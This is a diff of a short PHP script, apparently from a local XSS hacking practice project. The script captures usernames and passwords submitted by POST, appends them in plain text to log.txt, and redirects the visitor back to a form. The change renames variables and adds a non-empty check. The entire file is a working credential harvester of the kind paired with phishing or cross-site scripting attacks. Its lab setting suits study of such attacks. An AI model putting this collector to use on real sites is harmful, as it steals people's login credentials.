@@ -1,13 +1,14 @@
 <?php
 
-$un = $_POST['username'];
-$pw = $_POST['password'];
+$username = $_POST['username'];
+$password = $_POST['password'];
 
-$write_string = 'un:'.$un.'-pw:'.$pw;
-
-$fp = fopen('log.txt', 'a');
-fwrite($fp, $write_string);
-fclose($fp);
+if($username && $password) {
+  $write_string = 'username:'.$username.'-password:'.$password;
+  $fp = fopen('log.txt', 'a');
+  fwrite($fp, $write_string);
+  fclose($fp);
+}
 
 header('Location: http://localhost:8888/php-hacking/xss-php/xss-form-action.php');
 
